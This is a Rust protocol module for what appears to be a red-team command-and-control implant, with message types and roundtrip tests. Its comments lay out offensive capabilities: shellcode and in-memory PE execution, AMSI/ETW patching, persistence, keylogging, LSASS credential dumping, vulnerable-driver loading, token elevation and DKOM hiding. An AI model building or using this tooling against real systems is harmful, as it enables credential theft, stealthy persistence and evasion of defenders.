use crate::frame::ProtocolError;

pub mod msg {
    pub const REGISTER: u8 = 0x01;
    pub const TASK_POLL: u8 = 0x02;
    pub const TASK: u8 = 0x03;
    pub const RESULT: u8 = 0x04;
    pub const CHUNK: u8 = 0x05;
    pub const PING: u8 = 0x06;
    pub const PONG: u8 = 0x07;
    pub const SLEEP: u8 = 0x08;
    pub const ERROR: u8 = 0x09;
    pub const BATCH_END: u8 = 0x0A;
    /// Server-driven configuration update (ABR-T037): rides the normal
    /// frame channel inside the REGISTER response or a poll response
    /// whose rule resolution changed. No task, no result — the implant
    /// applies silently and the server audits `config_delivered`.
    pub const CONFIG: u8 = 0x10;
}

pub mod task_kind {
    pub const SHELL: u8 = 0x01;
    pub const UPLOAD: u8 = 0x02;
    pub const DOWNLOAD: u8 = 0x03;
    pub const EXIT: u8 = 0x04;
    pub const SLEEP: u8 = 0x05;
    pub const MODULE: u8 = 0x06;
    pub const DRIVER: u8 = 0x07;
    /// In-process shellcode execution — position-independent payload
    /// blob copied to a private RX region and called on the session
    /// thread (ABR-T022). Capped at 48 KB by the frame ceiling.
    pub const EXEC: u8 = 0x08;
    /// In-process .NET assembly execution through bare CLR hosting with
    /// optional AMSI/ETW patching first (ABR-T024/T025). Same cap.
    pub const EXECASM: u8 = 0x09;
    /// In-process PowerShell execution: the teamserver compiles and
    /// ships the bootstrap assembly, the implant patches AMSI/ETW and
    /// runs the script inside its own CLR instance — no powershell.exe
    /// (ABR-T024/T026).
    pub const POWERSHELL: u8 = 0x0A;
    /// In-memory native PE execution (.exe/.dll) through the user-mode
    /// manual mapper with exit redirection (ABR-T027). `data` inline
    /// (48 KB cap) or `path` of an uploaded stage deleted after load.
    pub const RUNPE: u8 = 0x0B;
    /// Host persistence install/remove/list by mechanism (ABR-T030).
    pub const PERSIST: u8 = 0x0C;
    /// Collection: screenshot, clipboard, keylog dump (ABR-T031).
    pub const COLLECT: u8 = 0x0D;
    /// Credential access: LSASS dump variants (ABR-T032/T033).
    pub const CRED: u8 = 0x0E;
    /// In-process COFF object execution (ABR-T034).
    pub const EXECBOF: u8 = 0x0F;
}

/// Sub-actions of the CRED task kind (ABR-T032/T033).
pub mod cred_action {
    /// LSASS minidump via user-mode reads: NtOpenProcess(VM_READ) +
    /// NtReadVirtualMemory through the indirect-syscall layer; Sysmon
    /// EID 10 sees the handle open (T032).
    pub const LSASS_USER: u8 = 0x00;
    /// LSASS minidump via the kernel path: iqvw64e kernel calls
    /// (KeStackAttachProcess + memcpy + detach), no process handle —
    /// no user-mode LSASS access telemetry (T033; requires the staged
    /// driver).
    pub const LSASS_KERNEL: u8 = 0x01;
}

/// Sub-actions of the COLLECT task kind (ABR-T031).
pub mod collect_action {
    /// Virtual-screen capture as PNG (BMP fallback), chunked result.
    pub const SCREENSHOT: u8 = 0x00;
    /// Clipboard text (CF_UNICODETEXT) at request time.
    pub const CLIPBOARD: u8 = 0x01;
    /// Return and clear the keylog buffer (sampled per beacon cycle).
    pub const KEYLOG_DUMP: u8 = 0x02;
}

/// Sub-actions of the PERSIST task kind (ABR-T030).
pub mod persist_action {
    /// Install the mechanism (copying the implant when `exe` is empty).
    pub const INSTALL: u8 = 0x00;
    /// Remove the mechanism's artifacts by name.
    pub const REMOVE: u8 = 0x01;
    /// Report the live state of every mechanism.
    pub const LIST: u8 = 0x02;
}

/// Sub-actions of the DRIVER task kind (ABR-T013/T014).
pub mod driver_action {
    /// Copy the driver file, register a kernel service on it and start it.
    pub const LOAD: u8 = 0x00;
    /// Stop the service if running, deregister it and delete the file.
    pub const UNLOAD: u8 = 0x01;
    /// Open every known vulnerable-driver device and prove kernel
    /// read primitives on the first that answers (ABR-T014).
    pub const PROBE: u8 = 0x02;
    /// Arbitrary kernel-write proof: swap the implant EPROCESS token to
    /// SYSTEM, verify from the same thread, restore (ABR-T015).
    pub const ELEVATE: u8 = 0x03;
    /// Capability survey + tier verdict before staging decisions
    /// (stage 3.5).
    pub const GATE: u8 = 0x04;
    /// DKOM: unlink the implant from ActiveProcessLinks (ABR-T016).
    pub const HIDE: u8 = 0x05;
    /// DKOM restore, only while the saved neighbors still hold.
    pub const UNHIDE: u8 = 0x06;
    /// Kernel-function-call proof on the call-capable driver
    /// (ExAllocatePoolWithTag round-trip through the NtAddAtom
    /// trampoline, fully restored — ABR-T017).
    pub const CALL: u8 = 0x07;
    /// Read-only validation of the dual-driver CALL path. It resolves
    /// every address and compares several VA/PA views, but performs no
    /// physical write, dispatch-table patch or kernel trigger.
    pub const CALL_PREFLIGHT: u8 = 0x08;
    /// KDMapper-style manual mapping of an unsigned driver PE into
    /// NonPagedPool through iqvw64e — sections, relocations, imports
    /// and a real DriverEntry invocation (ABR-T018). Empty source maps
    /// the builtin in-memory proof payload; a set source maps that
    /// operator-supplied `.sys` file and keeps it resident.
    pub const MAP: u8 = 0x09;
    /// DKOM on the loader itself: unlink its KLDR_DATA_TABLE_ENTRY from
    /// nt!PsLoadedModuleList so driver enumeration goes blind while the
    /// image stays mapped (ABR-T019). `source` = module name.
    pub const MODHIDE: u8 = 0x0A;
    /// Restore the unlinked module entry (guarded relink, ABR-T019).
    pub const MODSHOW: u8 = 0x0B;
    /// EPROCESS.Protection spoof - copy the SYSTEM process's protection
    /// byte so termination from unprotected contexts is denied
    /// (ABR-T020). `source` = "on" | "off".
    pub const PROTECT: u8 = 0x0C;
    /// Covert-channel command to the mapped resident payload
    /// (ABR-T021). `source` = "hb" | "ping" | "protect <pid>" |
    /// "unprotect" | "stop" over the shared NonPagedPool block.
    pub const CHAN: u8 = 0x0D;
}

pub const STATUS_OK: u8 = 0;
pub const STATUS_ERROR: u8 = 1;
pub const ARCH_ARM64: u8 = 0;
pub const ARCH_X64: u8 = 1;

#[derive(Debug, Clone, PartialEq)]
pub struct RegisterInfo {
    /// Per-process session token: 0 on first contact, then reused on
    /// every re-register so the teamserver can RESUME the same session
    /// (id + queued tasks) when a fronting proxy drops the transport.
    pub session_token: u64,
    pub hostname: String,
    pub username: String,
    pub domain: String,
    pub pid: u32,
    pub ppid: u32,
    pub arch: u8,
    pub integrity_level: u8,
    pub os_build: String,
    pub implant_version: String,
}

#[derive(Debug, Clone, PartialEq)]
pub enum TaskBody {
    Shell {
        command: String,
    },
    Upload {
        path: String,
    },
    Download {
        path: String,
    },
    Sleep {
        secs: u64,
        jitter: f32,
    },
    /// Executes a built-in in-process module by name — collection and
    /// execution without spawning a child process (ABR-T011).
    Module {
        name: String,
        args: String,
    },
    /// Kernel-driver staging lifecycle through the SCM: copy a driver
    /// file, register a kernel service on it and start it, or stop,
    /// deregister and delete it (ABR-T013). Stage 3.1 of the BYOVD
    /// chain — exercised against benign signed drivers first.
    Driver {
        action: u8,
        service: String,
        source: String,
        drop_path: String,
    },
    /// In-process shellcode execution without a child process or a new
    /// thread (ABR-T022).
    Execute {
        data: Vec<u8>,
    },
    /// Runs a .NET Framework assembly inside the implant via CLR
    /// hosting: `public static int <method_name>(string)` in
    /// `type_name` (ABR-T025); `patch` arms ABR-T024 first.
    ExecuteAssembly {
        data: Vec<u8>,
        type_name: String,
        method_name: String,
        argument: String,
        patch: u8,
    },
    /// Runs a PowerShell script in-process through the bootstrap
    /// assembly carried in `bootstrap` (compiled from tools/psboot.cs
    /// by the teamserver); ABR-T024 patches apply first (ABR-T026).
    PowerShell {
        script: String,
        bootstrap: Vec<u8>,
    },
    /// Maps and runs a native x64 PE inside the implant (ABR-T027):
    /// sections, DIR64 relocations, imports against live modules with
    /// ExitProcess-class entries redirected to ExitThread.
    RunPe {
        data: Vec<u8>,
        path: String,
    },
    /// Host persistence (ABR-T030): install/remove/list a mechanism.
    /// `mechanism` is one of run-key, run-key-hklm, startup, service,
    /// schtasks, wmi; `name` identifies the artifact (service name,
    /// task name, registry value), `exe` optionally overrides the
    /// installed binary (default: a copy of the implant itself),
    /// `args` are the persisted command arguments.
    Persist {
        action: u8,
        mechanism: String,
        name: String,
        exe: String,
        args: String,
    },
    /// Collection (ABR-T031): `action` selects screenshot / clipboard /
    /// keylog dump; `arg` carries per-action parameters.
    Collect {
        action: u8,
        arg: String,
    },
    /// Credential access (ABR-T032/T033): LSASS minidump through the
    /// custom writer; `action` selects the read path.
    Cred {
        action: u8,
        arg: String,
    },
    /// In-process COFF object execution (ABR-T034, BOF convention):
    /// `data` is the x64 .obj, `args` the pre-packed Beacon argument
    /// buffer ([u32 total][i32 type][payload]*).
    ExecBof {
        data: Vec<u8>,
        args: Vec<u8>,
    },
    Exit,
}

#[derive(Debug, Clone, PartialEq)]
pub struct Task {
    pub id: u32,
    pub body: TaskBody,
}

#[derive(Debug, Clone, PartialEq)]
pub struct TaskResult {
    pub id: u32,
    pub status: u8,
    pub data: Vec<u8>,
}

#[derive(Debug, Clone, PartialEq)]
pub struct Chunk {
    pub task_id: u32,
    pub seq: u32,
    pub data: Vec<u8>,
    pub last: bool,
}

#[derive(Debug, Clone, PartialEq)]
pub enum Message {
    Register(RegisterInfo),
    TaskPoll,
    Task(Task),
    TaskResult(TaskResult),
    Chunk(Chunk),
    Ping,
    Pong,
    Sleep { secs: u64, jitter: f32 },
    Error { code: u8, message: String },
    BatchEnd,
    Config(ConfigUpdate),
}

/// Server-driven configuration payload (ABR-T037). Every field carries a
/// "keep" sentinel so a rule can override only what it names: sleep stays
/// at `KEEP_SLEEP_SECS`, jitter at `KEEP_JITTER`, and empty lists keep the
/// implant's current URIs / user-agent pool. `epoch` is the server's
/// global rule-table revision, echoed back by nothing (the server tracks
/// what each session applied) but useful in audits.
#[derive(Debug, Clone, PartialEq)]
pub struct ConfigUpdate {
    pub epoch: u64,
    pub sleep_secs: u64,
    pub jitter: f32,
    pub uris: Vec<String>,
    pub user_agents: Vec<String>,
}

impl ConfigUpdate {
    pub const KEEP_SLEEP_SECS: u64 = u64::MAX;
    pub const KEEP_JITTER: f32 = -1.0;

    /// An update that changes nothing — the "no rule matched" encoding.
    pub fn noop(epoch: u64) -> Self {
        ConfigUpdate {
            epoch,
            sleep_secs: Self::KEEP_SLEEP_SECS,
            jitter: Self::KEEP_JITTER,
            uris: Vec::new(),
            user_agents: Vec::new(),
        }
    }

    pub fn changes_something(&self) -> bool {
        self.sleep_secs != Self::KEEP_SLEEP_SECS
            || self.jitter != Self::KEEP_JITTER
            || !self.uris.is_empty()
            || !self.user_agents.is_empty()
    }
}

fn put_str(buf: &mut Vec<u8>, value: &str) {
    put_u16(buf, value.len() as u16);
    buf.extend_from_slice(value.as_bytes());
}

fn put_u8(buf: &mut Vec<u8>, value: u8) {
    buf.push(value);
}

fn put_u16(buf: &mut Vec<u8>, value: u16) {
    buf.extend_from_slice(&value.to_be_bytes());
}

fn put_u32(buf: &mut Vec<u8>, value: u32) {
    buf.extend_from_slice(&value.to_be_bytes());
}

fn put_u64(buf: &mut Vec<u8>, value: u64) {
    buf.extend_from_slice(&value.to_be_bytes());
}

fn put_f32(buf: &mut Vec<u8>, value: f32) {
    put_u32(buf, value.to_bits());
}

fn put_blob(buf: &mut Vec<u8>, value: &[u8]) {
    put_u32(buf, value.len() as u32);
    buf.extend_from_slice(value);
}

struct Reader<'a> {
    data: &'a [u8],
    pos: usize,
}

impl<'a> Reader<'a> {
    fn new(data: &'a [u8]) -> Self {
        Reader { data, pos: 0 }
    }

    fn take(&mut self, n: usize) -> Result<&'a [u8], ProtocolError> {
        if self.pos + n > self.data.len() {
            return Err(ProtocolError::Malformed("truncated payload".into()));
        }
        let slice = &self.data[self.pos..self.pos + n];
        self.pos += n;
        Ok(slice)
    }

    fn u8(&mut self) -> Result<u8, ProtocolError> {
        Ok(self.take(1)?[0])
    }

    fn u16(&mut self) -> Result<u16, ProtocolError> {
        let bytes = self.take(2)?;
        Ok(u16::from_be_bytes([bytes[0], bytes[1]]))
    }

    fn u32(&mut self) -> Result<u32, ProtocolError> {
        let bytes = self.take(4)?;
        Ok(u32::from_be_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]))
    }

    fn u64(&mut self) -> Result<u64, ProtocolError> {
        let bytes = self.take(8)?;
        Ok(u64::from_be_bytes([
            bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5], bytes[6], bytes[7],
        ]))
    }

    fn f32(&mut self) -> Result<f32, ProtocolError> {
        Ok(f32::from_bits(self.u32()?))
    }

    fn string(&mut self) -> Result<String, ProtocolError> {
        let n = self.u16()? as usize;
        let bytes = self.take(n)?.to_vec();
        String::from_utf8(bytes).map_err(|_| ProtocolError::Malformed("invalid utf-8".into()))
    }

    fn blob(&mut self) -> Result<Vec<u8>, ProtocolError> {
        let n = self.u32()? as usize;
        Ok(self.take(n)?.to_vec())
    }
}

impl Message {
    pub fn encode(&self) -> (u8, Vec<u8>) {
        let mut buf = Vec::new();
        match self {
            Message::Register(info) => {
                put_u64(&mut buf, info.session_token);
                put_str(&mut buf, &info.hostname);
                put_str(&mut buf, &info.username);
                put_str(&mut buf, &info.domain);
                put_u32(&mut buf, info.pid);
                put_u32(&mut buf, info.ppid);
                put_u8(&mut buf, info.arch);
                put_u8(&mut buf, info.integrity_level);
                put_str(&mut buf, &info.os_build);
                put_str(&mut buf, &info.implant_version);
                (msg::REGISTER, buf)
            }
            Message::TaskPoll => (msg::TASK_POLL, buf),
            Message::Task(task) => {
                put_u32(&mut buf, task.id);
                match &task.body {
                    TaskBody::Shell { command } => {
                        put_u8(&mut buf, task_kind::SHELL);
                        put_str(&mut buf, command);
                    }
                    TaskBody::Upload { path } => {
                        put_u8(&mut buf, task_kind::UPLOAD);
                        put_str(&mut buf, path);
                    }
                    TaskBody::Download { path } => {
                        put_u8(&mut buf, task_kind::DOWNLOAD);
                        put_str(&mut buf, path);
                    }
                    TaskBody::Sleep { secs, jitter } => {
                        put_u8(&mut buf, task_kind::SLEEP);
                        put_u64(&mut buf, *secs);
                        put_f32(&mut buf, *jitter);
                    }
                    TaskBody::Module { name, args } => {
                        put_u8(&mut buf, task_kind::MODULE);
                        put_str(&mut buf, name);
                        put_str(&mut buf, args);
                    }
                    TaskBody::Driver {
                        action,
                        service,
                        source,
                        drop_path,
                    } => {
                        put_u8(&mut buf, task_kind::DRIVER);
                        put_u8(&mut buf, *action);
                        put_str(&mut buf, service);
                        put_str(&mut buf, source);
                        put_str(&mut buf, drop_path);
                    }
                    TaskBody::Execute { data } => {
                        put_u8(&mut buf, task_kind::EXEC);
                        put_blob(&mut buf, data);
                    }
                    TaskBody::PowerShell { script, bootstrap } => {
                        put_u8(&mut buf, task_kind::POWERSHELL);
                        put_str(&mut buf, script);
                        put_blob(&mut buf, bootstrap);
                    }
                    TaskBody::RunPe { data, path } => {
                        put_u8(&mut buf, task_kind::RUNPE);
                        put_blob(&mut buf, data);
                        put_str(&mut buf, path);
                    }
                    TaskBody::Persist {
                        action,
                        mechanism,
                        name,
                        exe,
                        args,
                    } => {
                        put_u8(&mut buf, task_kind::PERSIST);
                        put_u8(&mut buf, *action);
                        put_str(&mut buf, mechanism);
                        put_str(&mut buf, name);
                        put_str(&mut buf, exe);
                        put_str(&mut buf, args);
                    }
                    TaskBody::Collect { action, arg } => {
                        put_u8(&mut buf, task_kind::COLLECT);
                        put_u8(&mut buf, *action);
                        put_str(&mut buf, arg);
                    }
                    TaskBody::Cred { action, arg } => {
                        put_u8(&mut buf, task_kind::CRED);
                        put_u8(&mut buf, *action);
                        put_str(&mut buf, arg);
                    }
                    TaskBody::ExecBof { data, args } => {
                        put_u8(&mut buf, task_kind::EXECBOF);
                        put_blob(&mut buf, data);
                        put_blob(&mut buf, args);
                    }
                    TaskBody::ExecuteAssembly {
                        data,
                        type_name,
                        method_name,
                        argument,
                        patch,
                    } => {
                        put_u8(&mut buf, task_kind::EXECASM);
                        put_blob(&mut buf, data);
                        put_str(&mut buf, type_name);
                        put_str(&mut buf, method_name);
                        put_str(&mut buf, argument);
                        put_u8(&mut buf, *patch);
                    }
                    TaskBody::Exit => {
                        put_u8(&mut buf, task_kind::EXIT);
                    }
                }
                (msg::TASK, buf)
            }
            Message::TaskResult(result) => {
                put_u32(&mut buf, result.id);
                put_u8(&mut buf, result.status);
                put_blob(&mut buf, &result.data);
                (msg::RESULT, buf)
            }
            Message::Chunk(chunk) => {
                put_u32(&mut buf, chunk.task_id);
                put_u32(&mut buf, chunk.seq);
                put_blob(&mut buf, &chunk.data);
                put_u8(&mut buf, chunk.last as u8);
                (msg::CHUNK, buf)
            }
            Message::Ping => (msg::PING, buf),
            Message::Pong => (msg::PONG, buf),
            Message::Sleep { secs, jitter } => {
                put_u64(&mut buf, *secs);
                put_f32(&mut buf, *jitter);
                (msg::SLEEP, buf)
            }
            Message::Error { code, message } => {
                put_u8(&mut buf, *code);
                put_str(&mut buf, message);
                (msg::ERROR, buf)
            }
            Message::BatchEnd => (msg::BATCH_END, buf),
            Message::Config(cfg) => {
                put_u64(&mut buf, cfg.epoch);
                put_u64(&mut buf, cfg.sleep_secs);
                put_f32(&mut buf, cfg.jitter);
                put_u16(&mut buf, cfg.uris.len() as u16);
                for uri in &cfg.uris {
                    put_str(&mut buf, uri);
                }
                put_u16(&mut buf, cfg.user_agents.len() as u16);
                for ua in &cfg.user_agents {
                    put_str(&mut buf, ua);
                }
                (msg::CONFIG, buf)
            }
        }
    }

    pub fn decode(msg_type: u8, data: &[u8]) -> Result<Self, ProtocolError> {
        let mut r = Reader::new(data);
        Ok(match msg_type {
            msg::REGISTER => Message::Register(RegisterInfo {
                session_token: r.u64()?,
                hostname: r.string()?,
                username: r.string()?,
                domain: r.string()?,
                pid: r.u32()?,
                ppid: r.u32()?,
                arch: r.u8()?,
                integrity_level: r.u8()?,
                os_build: r.string()?,
                implant_version: r.string()?,
            }),
            msg::TASK_POLL => Message::TaskPoll,
            msg::TASK => {
                let id = r.u32()?;
                let kind = r.u8()?;
                let body = match kind {
                    task_kind::SHELL => TaskBody::Shell {
                        command: r.string()?,
                    },
                    task_kind::UPLOAD => TaskBody::Upload { path: r.string()? },
                    task_kind::DOWNLOAD => TaskBody::Download { path: r.string()? },
                    task_kind::SLEEP => TaskBody::Sleep {
                        secs: r.u64()?,
                        jitter: r.f32()?,
                    },
                    task_kind::MODULE => TaskBody::Module {
                        name: r.string()?,
                        args: r.string()?,
                    },
                    task_kind::DRIVER => TaskBody::Driver {
                        action: r.u8()?,
                        service: r.string()?,
                        source: r.string()?,
                        drop_path: r.string()?,
                    },
                    task_kind::EXEC => TaskBody::Execute { data: r.blob()? },
                    task_kind::POWERSHELL => TaskBody::PowerShell {
                        script: r.string()?,
                        bootstrap: r.blob()?,
                    },
                    task_kind::RUNPE => TaskBody::RunPe {
                        data: r.blob()?,
                        path: r.string()?,
                    },
                    task_kind::PERSIST => TaskBody::Persist {
                        action: r.u8()?,
                        mechanism: r.string()?,
                        name: r.string()?,
                        exe: r.string()?,
                        args: r.string()?,
                    },
                    task_kind::COLLECT => TaskBody::Collect {
                        action: r.u8()?,
                        arg: r.string()?,
                    },
                    task_kind::CRED => TaskBody::Cred {
                        action: r.u8()?,
                        arg: r.string()?,
                    },
                    task_kind::EXECBOF => TaskBody::ExecBof {
                        data: r.blob()?,
                        args: r.blob()?,
                    },
                    task_kind::EXECASM => TaskBody::ExecuteAssembly {
                        data: r.blob()?,
                        type_name: r.string()?,
                        method_name: r.string()?,
                        argument: r.string()?,
                        patch: r.u8()?,
                    },
                    task_kind::EXIT => TaskBody::Exit,
                    _ => {
                        return Err(ProtocolError::Malformed(format!(
                            "unknown task kind {kind:#04x}"
                        )))
                    }
                };
                Message::Task(Task { id, body })
            }
            msg::RESULT => Message::TaskResult(TaskResult {
                id: r.u32()?,
                status: r.u8()?,
                data: r.blob()?,
            }),
            msg::CHUNK => Message::Chunk(Chunk {
                task_id: r.u32()?,
                seq: r.u32()?,
                data: r.blob()?,
                last: r.u8()? != 0,
            }),
            msg::PING => Message::Ping,
            msg::PONG => Message::Pong,
            msg::SLEEP => Message::Sleep {
                secs: r.u64()?,
                jitter: r.f32()?,
            },
            msg::ERROR => Message::Error {
                code: r.u8()?,
                message: r.string()?,
            },
            msg::BATCH_END => Message::BatchEnd,
            msg::CONFIG => {
                let epoch = r.u64()?;
                let sleep_secs = r.u64()?;
                let jitter = f32::from_bits(r.u32()?);
                let uri_count = r.u16()? as usize;
                let mut uris = Vec::with_capacity(uri_count);
                for _ in 0..uri_count {
                    uris.push(r.string()?);
                }
                let ua_count = r.u16()? as usize;
                let mut user_agents = Vec::with_capacity(ua_count);
                for _ in 0..ua_count {
                    user_agents.push(r.string()?);
                }
                Message::Config(ConfigUpdate {
                    epoch,
                    sleep_secs,
                    jitter,
                    uris,
                    user_agents,
                })
            }
            _ => {
                return Err(ProtocolError::Malformed(format!(
                    "unknown message type {msg_type:#04x}"
                )))
            }
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn roundtrip(message: Message) {
        let (msg_type, buf) = message.encode();
        let decoded = Message::decode(msg_type, &buf).unwrap();
        assert_eq!(decoded, message);
    }

    #[test]
    fn messages_roundtrip() {
        roundtrip(Message::TaskPoll);
        roundtrip(Message::Config(ConfigUpdate::noop(7)));
        roundtrip(Message::Config(ConfigUpdate {
            epoch: 42,
            sleep_secs: 2,
            jitter: 0.1,
            uris: vec!["/a".into(), "/b".into()],
            user_agents: vec!["ua-one".into()],
        }));
        roundtrip(Message::Ping);
        roundtrip(Message::Pong);
        roundtrip(Message::BatchEnd);
        roundtrip(Message::Sleep {
            secs: 30,
            jitter: 0.25,
        });
        roundtrip(Message::Error {
            code: 1,
            message: "boom".into(),
        });
        roundtrip(Message::Register(RegisterInfo {
            hostname: "lab-host".into(),
            username: "antho".into(),
            domain: "LAB".into(),
            pid: 1234,
            ppid: 5678,
            arch: ARCH_X64,
            integrity_level: 2,
            os_build: "10.0.19045".into(),
            implant_version: "0.1.0".into(),
            session_token: 0,
        }));
        roundtrip(Message::Task(Task {
            id: 7,
            body: TaskBody::Shell {
                command: "whoami".into(),
            },
        }));
        roundtrip(Message::Task(Task {
            id: 8,
            body: TaskBody::Download {
                path: "C:\\temp\\doc.pdf".into(),
            },
        }));
        roundtrip(Message::Task(Task {
            id: 9,
            body: TaskBody::Module {
                name: "ps".into(),
                args: "".into(),
            },
        }));
        roundtrip(Message::Task(Task {
            id: 10,
            body: TaskBody::Driver {
                action: driver_action::LOAD,
                service: "abraham-standin".into(),
                source: "C:\\Windows\\System32\\drivers\\null.sys".into(),
                drop_path: "C:\\Users\\lab\\AppData\\Local\\Temp\\null.sys".into(),
            },
        }));
        roundtrip(Message::Task(Task {
            id: 11,
            body: TaskBody::Driver {
                action: driver_action::UNLOAD,
                service: "abraham-standin".into(),
                source: String::new(),
                drop_path: "C:\\Users\\lab\\AppData\\Local\\Temp\\null.sys".into(),
            },
        }));
        roundtrip(Message::Task(Task {
            id: 12,
            body: TaskBody::Driver {
                action: driver_action::CALL_PREFLIGHT,
                service: String::new(),
                source: String::new(),
                drop_path: String::new(),
            },
        }));
        roundtrip(Message::Task(Task {
            id: 13,
            body: TaskBody::Execute {
                data: vec![0xB8, 0x37, 0x13, 0x00, 0x00, 0xC3],
            },
        }));
        roundtrip(Message::Task(Task {
            id: 14,
            body: TaskBody::ExecuteAssembly {
                data: vec![0x4D, 0x5A],
                type_name: "Prog".into(),
                method_name: "Go".into(),
                argument: "lab".into(),
                patch: 1,
            },
        }));
        roundtrip(Message::Task(Task {
            id: 15,
            body: TaskBody::PowerShell {
                script: "Write-Output hi".into(),
                bootstrap: vec![0x4D, 0x5A, 0x00, 0x01],
            },
        }));
        roundtrip(Message::Task(Task {
            id: 16,
            body: TaskBody::RunPe {
                data: Vec::new(),
                path: "C:\\stage\\p.exe".into(),
            },
        }));
        roundtrip(Message::Task(Task {
            id: 12,
            body: TaskBody::Persist {
                action: persist_action::INSTALL,
                mechanism: "run-key".into(),
                name: "OneSync".into(),
                exe: String::new(),
                args: "--bg".into(),
            },
        }));
        roundtrip(Message::Task(Task {
            id: 13,
            body: TaskBody::Collect {
                action: collect_action::SCREENSHOT,
                arg: String::new(),
            },
        }));
        roundtrip(Message::Task(Task {
            id: 14,
            body: TaskBody::Cred {
                action: cred_action::LSASS_USER,
                arg: String::new(),
            },
        }));
        roundtrip(Message::Task(Task {
            id: 15,
            body: TaskBody::ExecBof {
                data: vec![0x64, 0x86],
                args: vec![8, 0, 0, 0, 0, 0, 0, 0],
            },
        }));
        roundtrip(Message::TaskResult(TaskResult {
            id: 7,
            status: STATUS_OK,
            data: b"lab-host\\antho".to_vec(),
        }));
        roundtrip(Message::Chunk(Chunk {
            task_id: 8,
            seq: 3,
            data: vec![1, 2, 3, 4],
            last: true,
        }));
    }

    #[test]
    fn truncated_payload_is_rejected() {
        let (_, buf) = Message::Register(RegisterInfo {
            hostname: "h".into(),
            username: "u".into(),
            domain: "d".into(),
            pid: 1,
            ppid: 2,
            arch: 1,
            integrity_level: 1,
            os_build: "b".into(),
            implant_version: "0".into(),
            session_token: 42,
        })
        .encode();
        assert!(matches!(
            Message::decode(msg::REGISTER, &buf[..buf.len() - 1]),
            Err(ProtocolError::Malformed(_))
        ));
    }
}
